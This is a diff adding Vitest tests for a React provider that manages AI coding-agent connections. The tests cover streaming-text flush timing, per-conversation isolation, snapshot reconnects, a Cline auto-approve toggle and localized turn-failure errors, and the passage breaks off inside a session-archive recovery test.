@@ -1,8 +1,10 @@
 import { useEffect, type ReactNode } from "react"
-import { act, render, screen, waitFor } from "@testing-library/react"
+import { act, cleanup, render, screen, waitFor } from "@testing-library/react"
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
 import {
   AcpConnectionsProvider,
+  STREAM_FLUSH_FRAME_MS,
+  STREAM_FLUSH_MAX_MS,
   useAcpActions,
   useConnectionStore,
   isRetryableObserverDiscoveryError,
@@ -7189,6 +7191,605 @@ describe("out-of-turn wire guard + background activity", () => {
   })
 })
 
+describe("streaming flush window widens with the run it re-renders", () => {
+  async function mountStreamingOwner() {
+    h.acpFindConnectionForConversation.mockResolvedValue(null)
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-1", 42)
+    })
+    const handlers = latestAttachHandlers()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "status_changed",
+      status: "prompting",
+    })
+    return handlers
+  }
+
+  function liveTextFor(key: string): string {
+    const content = h.store!.getConnection(key)?.liveMessage?.content ?? []
+    return content
+      .map((block) => (block.type === "text" ? block.text : ""))
+      .join("")
+  }
+
+  function liveText(): string {
+    return liveTextFor(TAB)
+  }
+
+  /** A second conversation streaming at the same time, on its own connection. */
+  const OTHER_TAB = "conv-2-claude_code-43"
+
+  async function mountTwoStreamingOwners() {
+    h.acpFindConnectionForConversation.mockResolvedValue(null)
+    h.acpConnect.mockReset()
+    h.acpConnect
+      .mockResolvedValueOnce("conn-a")
+      .mockResolvedValueOnce("conn-b")
+      .mockResolvedValue("conn-extra")
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/a", "sess-a", 42)
+    })
+    const a = latestAttachHandlers()
+    await act(async () => {
+      await h.actions!.connect(OTHER_TAB, "claude_code", "/tmp/b", "sess-b", 43)
+    })
+    const b = latestAttachHandlers()
+    for (const [handlers, id] of [
+      [a, "conn-a"],
+      [b, "conn-b"],
+    ] as const) {
+      emitAcpEvent(handlers, {
+        seq: 1,
+        connection_id: id,
+        type: "status_changed",
+        status: "prompting",
+      })
+    }
+    return { a, b }
+  }
+
+  it("holds a long run for more frames, and delivers exactly what arrived", async () => {
+    const handlers = await mountStreamingOwner()
+    // Mount and connect on real timers (they await the transport); only the
+    // flush window below is driven by hand.
+    vi.useFakeTimers()
+    try {
+      // First delta of the turn: the live message is empty, so the window is
+      // the single frame it has always been.
+      const head = "a".repeat(9000)
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: head,
+      })
+      expect(liveText()).toBe("")
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(head)
+
+      // The next delta is armed against a 9000-character run, which is past
+      // the first step: one frame is no longer enough to release it.
+      emitAcpEvent(handlers, {
+        seq: 3,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "b",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(head)
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(`${head}b`)
+
+      // Whatever the window, every chunk lands once and in order.
+      let expected = `${head}b`
+      for (let i = 0; i < 40; i++) {
+        const text = `-${i}-`
+        expected += text
+        emitAcpEvent(handlers, {
+          seq: 4 + i,
+          connection_id: "spawned-conn",
+          type: "content_delta",
+          text,
+        })
+        act(() => {
+          vi.advanceTimersByTime(STREAM_FLUSH_MAX_MS)
+        })
+      }
+      expect(liveText()).toBe(expected)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // The window is sized by the RUN the batch appends to, not by how much the
+  // turn has said in total: a reply that has already written 9 KB and then ran
+  // a tool is back to rendering a short block, and must not keep paying for
+  // the prose above it.
+  it("returns to a single frame when a new run starts", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "a".repeat(9000),
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+
+      // A tool call closes the prose run (and flushes the queue itself), so
+      // the reply that resumes after it starts short again.
+      emitAcpEvent(handlers, {
+        seq: 3,
+        connection_id: "spawned-conn",
+        type: "tool_call",
+        tool_call_id: "toolu_1",
+        title: "Read",
+        kind: "read",
+        status: "in_progress",
+        content: null,
+        raw_input: null,
+        raw_output: null,
+      })
+      emitAcpEvent(handlers, {
+        seq: 4,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "after",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(`${"a".repeat(9000)}after`)
+
+      // And it stays there while the new run is short, even though the turn
+      // now holds more than 9 KB in total.
+      emitAcpEvent(handlers, {
+        seq: 5,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: " more",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(`${"a".repeat(9000)}after more`)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // An event that flushes the queue mid-window must CANCEL that window, not
+  // just forget it. A forgotten timer still fires, releases whatever the next
+  // window had queued, and takes the ref down with it — so the window after it
+  // is forgotten too. One such event per turn is enough to halve the cadence,
+  // and a long turn has many (`usage_update`, `tool_call_update`, …), so the
+  // widening decays back to a flat 16 ms over exactly the turns it is for.
+  it("cancels the pending window when an event flushes the queue early", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      const head = "a".repeat(9000)
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: head,
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(head)
+
+      // Arms a two-frame window against the 9 KB run.
+      emitAcpEvent(handlers, {
+        seq: 3,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "b",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(head)
+
+      // One frame in, a non-streaming event flushes the queue itself.
+      emitAcpEvent(handlers, {
+        seq: 4,
+        connection_id: "spawned-conn",
+        type: "usage_update",
+        used: 1_000,
+        size: 200_000,
+      })
+      expect(liveText()).toBe(`${head}b`)
+
+      // The next delta arms its own two-frame window from here. The window the
+      // flush pre-empted must not fire inside it and cut it short.
+      emitAcpEvent(handlers, {
+        seq: 5,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "c",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(`${head}b`)
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveText()).toBe(`${head}bc`)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // Codeg runs several agents at once by design. A window sized from what one
+  // conversation is re-rendering must not be charged to another — least of all
+  // to a background one that costs nothing to flush and gains nothing by
+  // waiting.
+  it("never makes one conversation wait on another's long reply", async () => {
+    const { a, b } = await mountTwoStreamingOwners()
+    vi.useFakeTimers()
+    try {
+      const head = "a".repeat(9000)
+      emitAcpEvent(a, {
+        seq: 2,
+        connection_id: "conn-a",
+        type: "content_delta",
+        text: head,
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveTextFor(TAB)).toBe(head)
+
+      // A's next delta is armed against its 9 KB run — two frames. B has said
+      // nothing, so B's is one, and B must get it.
+      emitAcpEvent(a, {
+        seq: 3,
+        connection_id: "conn-a",
+        type: "content_delta",
+        text: "A",
+      })
+      emitAcpEvent(b, {
+        seq: 2,
+        connection_id: "conn-b",
+        type: "content_delta",
+        text: "B",
+      })
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveTextFor(OTHER_TAB)).toBe("B")
+      expect(liveTextFor(TAB)).toBe(head)
+
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveTextFor(TAB)).toBe(`${head}A`)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // The other half of the same rule: flushing one conversation out of turn
+  // must not release another's window early either.
+  it("does not let one conversation's event flush another's queue", async () => {
+    const { a, b } = await mountTwoStreamingOwners()
+    vi.useFakeTimers()
+    try {
+      emitAcpEvent(a, {
+        seq: 2,
+        connection_id: "conn-a",
+        type: "content_delta",
+        text: "A",
+      })
+      emitAcpEvent(b, {
+        seq: 2,
+        connection_id: "conn-b",
+        type: "content_delta",
+        text: "B",
+      })
+      // B's tool call flushes B's queue, and only B's.
+      emitAcpEvent(b, {
+        seq: 3,
+        connection_id: "conn-b",
+        type: "tool_call",
+        tool_call_id: "toolu_1",
+        title: "Read",
+        kind: "read",
+        status: "in_progress",
+        content: null,
+        raw_input: null,
+        raw_output: null,
+      })
+      // Positive half: the out-of-turn flush really did fire, so A's empty
+      // reading below is scoping, not a flush that silently does nothing.
+      expect(liveTextFor(OTHER_TAB)).toBe("B")
+      expect(liveTextFor(TAB)).toBe("")
+
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_FRAME_MS)
+      })
+      expect(liveTextFor(TAB)).toBe("A")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // A snapshot REPLACES the live message wholesale. Deltas still coalescing
+  // when one lands would append to the message it installed — which already
+  // contains them, because the snapshot is generated at a higher seq — and
+  // the reply shows the same prose twice. The attach stream re-emits a
+  // snapshot on RECONNECT, mid-turn, so this is what a dropped WebSocket does
+  // to a streaming reply, not a corner case.
+  it("lands coalesced deltas before a mid-turn snapshot replaces the message", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "hello ",
+      })
+      expect(liveText()).toBe("")
+
+      // The reconnect snapshot was generated after that delta reached the
+      // backend, so it already carries the text sitting in our window. Still
+      // `prompting`: the turn did not stop because the socket did.
+      h.denormalizeSnapshot.mockReturnValue({
+        connectionId: "spawned-conn",
+        status: "prompting",
+        sessionId: null,
+        modes: null,
+        configOptions: null,
+        availableCommands: null,
+        usage: null,
+        liveMessage: {
+          id: "live-1",
+          role: "assistant",
+          content: [{ type: "text", text: "hello " }],
+          startedAt: 0,
+        },
+        pendingPermission: null,
+        pendingAskQuestion: null,
+        pendingUserMessage: null,
+        promptCapabilities: null,
+        selectorsReady: false,
+        supportsFork: false,
+        configStale: false,
+        configStaleKind: null,
+        lastError: null,
+        eventSeq: 9,
+        activeDelegations: [],
+      })
+      hydrateSnapshot(handlers, {
+        event_seq: 9,
+      } as unknown as LiveSessionSnapshot)
+
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_MAX_MS)
+      })
+      expect(liveText()).toBe("hello ")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // …and FLUSH is why that is a flush and not a discard. A snapshot behind
+  // our cursor takes the stale branch, which merges selector fields and
+  // leaves `liveMessage` alone — so it never redelivers the queued prose, and
+  // dropping the queue there would lose it outright. Which branch a snapshot
+  // takes isn't knowable at the call site, so the safe move is the one that
+  // is correct on both.
+  it("keeps coalesced deltas a stale snapshot will not redeliver", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "hello ",
+      })
+      expect(liveText()).toBe("")
+
+      // eventSeq 1 is behind the cursor the delta above advanced to 2, so
+      // this hydrate takes the stale branch. Note it carries no live message
+      // of its own — the stale branch would ignore one anyway.
+      h.denormalizeSnapshot.mockReturnValue({
+        connectionId: "spawned-conn",
+        status: "connected",
+        sessionId: null,
+        modes: null,
+        configOptions: null,
+        availableCommands: null,
+        usage: null,
+        liveMessage: null,
+        pendingPermission: null,
+        pendingAskQuestion: null,
+        pendingUserMessage: null,
+        promptCapabilities: null,
+        selectorsReady: true,
+        supportsFork: false,
+        configStale: false,
+        configStaleKind: null,
+        lastError: null,
+        eventSeq: 1,
+        activeDelegations: [],
+      })
+      hydrateSnapshot(handlers, {
+        event_seq: 1,
+      } as unknown as LiveSessionSnapshot)
+
+      // The stale branch merged its latched field and left the turn alone…
+      expect(h.store!.getConnection(TAB)?.selectorsReady).toBe(true)
+      expect(h.store!.getConnection(TAB)?.status).toBe("prompting")
+      // …and the prose that was mid-window is on screen, not dropped.
+      expect(liveText()).toBe("hello ")
+
+      act(() => {
+        vi.advanceTimersByTime(STREAM_FLUSH_MAX_MS)
+      })
+      expect(liveText()).toBe("hello ")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // Removing the entry disarms its window: "no connection, no queue".
+  //
+  // Asserted on the timer rather than on rendered text, because the text is
+  // already defended twice over — `status_changed` flushes before it applies
+  // `prompting`, and the out-of-turn guard drops a batch for a connection
+  // that isn't prompting — so a leak would have to thread between both to
+  // show up on screen. The invariant is the thing worth pinning: context keys
+  // are REUSED (close a tab mid-turn and reopen it and the next connection is
+  // handed the same `conv-<id>-<agent>-<folder>` string), and a window that
+  // outlives its connection is a dispatch aimed at whoever holds the key up
+  // to STREAM_FLUSH_MAX_MS later. Cheap to keep impossible; unpleasant to
+  // rediscover from a duplicated paragraph in someone's reply.
+  it("disarms a removed connection's flush window", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      const idle = vi.getTimerCount()
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "from the turn that was closed",
+      })
+      expect(liveText()).toBe("")
+      expect(vi.getTimerCount()).toBe(idle + 1)
+
+      await act(async () => {
+        await h.actions!.disconnect(TAB)
+      })
+      expect(h.store!.getConnection(TAB)).toBeUndefined()
+      expect(vi.getTimerCount()).toBe(idle)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // Settling a connection the backend has forgotten is the one turn-ending
+  // path that dispatches STATUS_CHANGED directly instead of going through the
+  // event handler, so nothing else drains the queue — and the moment the
+  // entry reads `disconnected` the out-of-turn guard drops the batch. The
+  // last thing the agent managed to say should still be on screen.
+  it("lands what was mid-window when a connection is settled as gone", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "last words",
+      })
+      expect(liveText()).toBe("")
+
+      // Pressing Stop on a connection the backend no longer holds.
+      h.acpCancel.mockRejectedValueOnce(new Error("Connection not found"))
+      await act(async () => {
+        await h.actions!.cancel(TAB)
+      })
+
+      expect(h.store!.getConnection(TAB)?.status).toBe("disconnected")
+      expect(liveText()).toBe("last words")
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // The same rule on a different removal. `DELEGATION_CHILD_DETACH` drops an
+  // entry too, and it is why the discard is derived from the reducer's result
+  // rather than from a list of action types: closing the work-task transcript
+  // dialog on a streaming sub-agent must not leave a window armed either, and
+  // nobody should have to remember to extend a list to get that.
+  it("disarms a detached delegation child's flush window", async () => {
+    const CHILD = "task-conn-1"
+    await mountProvider()
+    act(() => {
+      h.actions!.attachDelegationChild({
+        connectionId: CHILD,
+        parentConnectionId: CHILD,
+        parentToolUseId: "work-task-9",
+        agentType: "claude_code",
+        hydrate: false,
+      })
+    })
+    const child = latestAttachHandlers()
+    emitAcpEvent(child, {
+      seq: 1,
+      connection_id: CHILD,
+      type: "status_changed",
+      status: "prompting",
+    })
+
+    vi.useFakeTimers()
+    try {
+      const idle = vi.getTimerCount()
+      emitAcpEvent(child, {
+        seq: 2,
+        connection_id: CHILD,
+        type: "content_delta",
+        text: "sub-agent, mid-sentence",
+      })
+      expect(vi.getTimerCount()).toBe(idle + 1)
+
+      act(() => {
+        h.actions!.detachDelegationChild(CHILD)
+      })
+      expect(h.store!.getConnection(CHILD)).toBeUndefined()
+      expect(vi.getTimerCount()).toBe(idle)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+
+  // …and the same on unmount. This suite runs the attach transport, which is
+  // the one whose windows used to survive: the legacy `acp://event` listener
+  // effect owned the cleanup, and it returns early — before registering any —
+  // for exactly the transports that stream through attach subscriptions.
+  it("drops every armed window when the provider unmounts", async () => {
+    const handlers = await mountStreamingOwner()
+    vi.useFakeTimers()
+    try {
+      const idle = vi.getTimerCount()
+      emitAcpEvent(handlers, {
+        seq: 2,
+        connection_id: "spawned-conn",
+        type: "content_delta",
+        text: "mid-sentence",
+      })
+      expect(vi.getTimerCount()).toBe(idle + 1)
+
+      // RTL's `cleanup` unmounts inside its own `act`, and clears its
+      // registry afterwards — so the suite's auto-cleanup is a no-op here.
+      cleanup()
+      expect(vi.getTimerCount()).toBe(idle)
+    } finally {
+      vi.useRealTimers()
+    }
+  })
+})
+
 describe("AcpConnectionsProvider Grok cross-agent-type model switch", () => {
   function grokModelOptions(current: string): SessionConfigOptionInfo[] {
     return [
@@ -7284,6 +7885,553 @@ describe("AcpConnectionsProvider Grok cross-agent-type model switch", () => {
     // The attempted model stays the saved preference (no revert of the persisted
     // choice), so a fresh session lands on Composer where the switch succeeds.
     expect(saveConfigPreference).toHaveBeenCalledTimes(1)
+  })
+
+  it("reports a rejected pick, and only when the backend says so", async () => {
+    // The backend owns the request↔answer correlation (`ConfigOptionRejected`):
+    // `acpSetConfigOption` resolves once the command is merely QUEUED, and the
+    // resulting option list is broadcast as an ordinary update — so this side
+    // must never try to infer a verdict from an option snapshot.
+    const handlers = await connectGrokOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: grokModelOptions("grok-4.5"),
+    })
+
+    h.toastWarning.mockClear()
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "model", "grok-composer-2.5-fast")
+    })
+    // The pick alone reports nothing — the agent may still honour it.
+    expect(h.toastWarning).not.toHaveBeenCalled()
+
+    emitAcpEvent(handlers, {
+      seq: 2,
+      connection_id: "spawned-conn",
+      type: "config_option_rejected",
+      config_id: "model",
+      option_name: "Model",
+      requested: "Composer 2.5",
+      actual: "Grok 4.5",
+      requested_value: "composer-2.5",
+      actual_value: "grok-4.5",
+    })
+    emitAcpEvent(handlers, {
+      seq: 3,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: grokModelOptions("grok-4.5"),
+    })
+
+    expect(h.toastWarning).toHaveBeenCalledTimes(1)
+    // The mock echoes the key; interpolated params may ride along.
+    expect(h.toastWarning).toHaveBeenCalledWith(
+      expect.stringMatching(/^configOptionAdjusted/)
+    )
+  })
+
+  it("stays silent for option snapshots nobody asked for", async () => {
+    // codex-acp flips `collaboration_mode` mid-turn, and pi answers one
+    // `set_config_option` with TWO snapshots (response + notification). None of
+    // those is a verdict; only an explicit rejection event is.
+    const handlers = await connectGrokOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: grokModelOptions("grok-4.5"),
+    })
+
+    h.toastWarning.mockClear()
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "model", "grok-composer-2.5-fast")
+    })
+    // Honoured, then a spontaneous switch back, then a duplicate echo.
+    for (const [seq, value] of [
+      [2, "grok-composer-2.5-fast"],
+      [3, "grok-4.5"],
+      [4, "grok-4.5"],
+    ] as const) {
+      emitAcpEvent(handlers, {
+        seq,
+        connection_id: "spawned-conn",
+        type: "session_config_options",
+        config_options: grokModelOptions(value),
+      })
+    }
+
+    expect(h.toastWarning).not.toHaveBeenCalled()
+  })
+
+  it("does not strand a verdict when the set fails outright", async () => {
+    // A failed `set_config_option` emits only a recoverable Error — no option
+    // snapshot at all. Nothing may linger to be charged against a later,
+    // unrelated update.
+    const handlers = await connectGrokOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: grokModelOptions("grok-4.5"),
+    })
+
+    h.toastWarning.mockClear()
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "model", "grok-composer-2.5-fast")
+    })
+    emitAcpEvent(handlers, {
+      seq: 2,
+      connection_id: "spawned-conn",
+      type: "error",
+      message: "Failed to set config option: boom",
+      agent_type: "grok",
+      code: null,
+    })
+    emitAcpEvent(handlers, {
+      seq: 3,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: grokModelOptions("grok-4.5"),
+    })
+
+    expect(h.toastWarning).not.toHaveBeenCalled()
+  })
+})
+
+// Cline 3.x is the first agent to ship a `boolean` config option
+// ("Auto-approve tools"). Verified against cline 3.0.62 over stdio: it accepts
+// `session/set_config_option` with the flattened `{type:"boolean",value:true}`
+// payload, answers with the full option list carrying the new `currentValue`,
+// AND pushes the same list again as a `config_option_update`. So every wire leg
+// works — the toggle was dead entirely inside this reducer (#709).
+describe("AcpConnectionsProvider boolean config option (cline auto-approve)", () => {
+  function clineOptions(autoApprove: boolean): SessionConfigOptionInfo[] {
+    return [
+      {
+        id: "mode",
+        name: "Session Mode",
+        category: "mode",
+        kind: {
+          type: "select",
+          current_value: "act",
+          options: [
+            { value: "plan", name: "Plan" },
+            { value: "act", name: "Act" },
+          ],
+          groups: [],
+        },
+      },
+      {
+        id: "auto_approve",
+        name: "Auto-approve tools",
+        description: "Automatically approve all tool calls",
+        kind: { type: "boolean", current_value: autoApprove },
+      },
+    ]
+  }
+
+  function autoApproveValue(): boolean | string | undefined {
+    const option = h
+      .store!.getConnection(TAB)!
+      .configOptions?.find((o) => o.id === "auto_approve")
+    return option?.kind.current_value
+  }
+
+  async function connectClineOwner(): Promise<AttachHandlers> {
+    h.acpGetAgentStatus.mockResolvedValue({
+      agent_type: "cline",
+      enabled: true,
+      available: true,
+      installed_version: "3.0.62",
+      host_tools_agent_mode: false,
+      is_acp_adapter: false,
+    })
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "cline", "/tmp/x", "sess-1")
+    })
+    return latestAttachHandlers()
+  }
+
+  it("flips the toggle optimistically when the user clicks it", async () => {
+    const handlers = await connectClineOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(false),
+    })
+    expect(autoApproveValue()).toBe(false)
+
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "auto_approve", "true")
+    })
+
+    expect(autoApproveValue()).toBe(true)
+    expect(saveConfigPreference).toHaveBeenCalledWith(
+      "cline",
+      "auto_approve",
+      "true"
+    )
+  })
+
+  it("applies the agent's own flip of a boolean option", async () => {
+    // The authoritative leg, independent of the optimistic one: cline answers
+    // every `set_config_option` with a fresh list and pushes a
+    // `config_option_update` besides. A value-blind equality check swallows
+    // both, which is what left the chip stuck even after a successful set.
+    const handlers = await connectClineOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(false),
+    })
+    expect(autoApproveValue()).toBe(false)
+
+    emitAcpEvent(handlers, {
+      seq: 2,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(true),
+    })
+
+    expect(autoApproveValue()).toBe(true)
+  })
+
+  it("snaps back when the agent settles the toggle the other way", async () => {
+    // Optimism without reconciliation is worse than no optimism: the chip would
+    // claim tools are auto-approved while the agent still asks for permission.
+    const handlers = await connectClineOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(false),
+    })
+
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "auto_approve", "true")
+    })
+    expect(autoApproveValue()).toBe(true)
+
+    emitAcpEvent(handlers, {
+      seq: 2,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(false),
+    })
+
+    expect(autoApproveValue()).toBe(false)
+  })
+
+  it("ignores a value that is neither on nor off", async () => {
+    // The optimistic hop is the one place a value is interpreted without the
+    // agent; anything but the two the toggle emits is a caller bug, and
+    // guessing "off" would be a silent lie about what tools may run.
+    const handlers = await connectClineOwner()
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_config_options",
+      config_options: clineOptions(true),
+    })
+
+    await act(async () => {
+      await h.actions!.setConfigOption(TAB, "auto_approve", "act")
+    })
+
+    expect(autoApproveValue()).toBe(true)
+  })
+})
+
+describe("empty-turn error diagnostics", () => {
+  async function connectOwner(): Promise<AttachHandlers> {
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x", "sess-1")
+    })
+    return latestAttachHandlers()
+  }
+
+  it("localizes each empty-turn code", async () => {
+    const handlers = await connectOwner()
+
+    const cases = [
+      ["turn_failed_empty", "backendErrors.turnFailedEmpty"],
+      ["turn_failed_empty_protocol", "backendErrors.turnFailedEmptyProtocol"],
+      ["turn_failed_empty_metadata", "backendErrors.turnFailedEmptyMetadata"],
+    ] as const
+
+    // Sequence numbers must advance — the store's seq guard drops replays.
+    cases.forEach(([code, key], i) => {
+      emitAcpEvent(handlers, {
+        seq: i + 1,
+        connection_id: "spawned-conn",
+        type: "error",
+        message: "raw english fallback",
+        agent_type: "claude_code",
+        code,
+      })
+      expect(h.store!.getConnection(TAB)!.error).toMatch(new RegExp(`^${key}`))
+    })
+  })
+
+  // claude-agent-acp 0.74.0 rejects the prompt with ACP's `authRequired` on a
+  // mid-session sign-out. The backend keeps that turn-scoped and synthesizes
+  // `turn_failed_auth_required`; without its own case here the user would get
+  // the raw English "needs you to sign in again" string instead.
+  it("localizes the auth-required turn code", async () => {
+    const handlers = await connectOwner()
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "error",
+      message: "raw english fallback",
+      agent_type: "claude_code",
+      code: "turn_failed_auth_required",
+    })
+
+    expect(h.store!.getConnection(TAB)!.error).toMatch(
+      /^backendErrors\.turnFailedAuthRequired/
+    )
+  })
+
+  it("routes details to the alert's evidence slot, keeping them out of detail, conn.error and the OS notification", async () => {
+    const handlers = await connectOwner()
+    h.pushAlert.mockClear()
+    h.notifyDesktop.mockClear()
+
+    const details =
+      "dropped 1 update(s) (0 decode, 1 dispatch)\nstderr (this turn, last 1 lines):\n  Error: 401 Unauthorized"
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "error",
+      message: "raw english fallback",
+      agent_type: "claude_code",
+      code: "turn_failed_empty_protocol",
+      details,
+    })
+
+    // The evidence rides its own slot so `StatusBarAlerts` can put it behind an
+    // expander; the always-visible detail slot stays the localized line.
+    const alertCalls = h.pushAlert.mock.calls
+    const [, , alertDetail, , alertEvidence] =
+      alertCalls[alertCalls.length - 1]!
+    expect(alertDetail).toMatch(/^backendErrors\.turnFailedEmptyProtocol/)
+    expect(alertEvidence).toBe(details)
+
+    // `conn.error` feeds the composer tooltip — the localized line plus a
+    // pointer at the only surface that can expand the evidence, never the
+    // evidence itself.
+    expect(h.store!.getConnection(TAB)!.error).toMatch(
+      /^backendErrors\.turnFailedEmptyProtocol/
+    )
+    expect(h.store!.getConnection(TAB)!.error).toContain(
+      "backendErrors.detailsInAlerts"
+    )
+
+    // Notification centers persist their payload outside the app.
+    const notifyCalls = h.notifyDesktop.mock.calls
+    const notificationArgs = notifyCalls[notifyCalls.length - 1]!
+    expect(JSON.stringify(notificationArgs)).not.toContain("401 Unauthorized")
+  })
+
+  it("omits blank details rather than rendering an empty block", async () => {
+    const handlers = await connectOwner()
+    h.pushAlert.mockClear()
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "error",
+      message: "raw english fallback",
+      agent_type: "claude_code",
+      code: "turn_failed_empty",
+      details: "   \n  ",
+    })
+
+    const alertCalls = h.pushAlert.mock.calls
+    const [, , alertDetail, , alertEvidence] =
+      alertCalls[alertCalls.length - 1]!
+    expect(alertDetail).toMatch(/^backendErrors\.turnFailedEmpty/)
+    expect(alertEvidence).toBeUndefined()
+    // Nothing to expand, so the tooltip must not send the user looking for an
+    // expander.
+    expect(h.store!.getConnection(TAB)!.error).toMatch(
+      /^backendErrors\.turnFailedEmpty/
+    )
+    expect(h.store!.getConnection(TAB)!.error).not.toContain(
+      "backendErrors.detailsInAlerts"
+    )
+  })
+})
+
+describe("session_load_failed archived-session recovery", () => {
+  async function connectOwner(agentType: string): Promise<AttachHandlers> {
+    await mountProvider()
+    await act(async () => {
+      await h.actions!.connect(TAB, agentType, "/tmp/x", "sess-1")
+    })
+    return latestAttachHandlers()
+  }
+
+  // The values the banner was built with, or undefined if it never asked for
+  // that message. (`findLast` is ES2023; this file targets ES2020.)
+  function lastArchivedCall() {
+    const calls = h.tCalls.filter(
+      ([key]) => key === "backendErrors.sessionArchived"
+    )
+    return calls[calls.length - 1]
+  }
+
+  const ARCHIVED_SID = "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47"
+  // What codex-acp actually answers session/load with after `codex archive`:
+  // a generic -32603 whose data spells out the session and the way back.
+  const RAW = `Internal error: {\n  "details": "session ${ARCHIVED_SID} is archived. Run \`codex unarchive ${ARCHIVED_SID}\` to restore it."\n}`
+
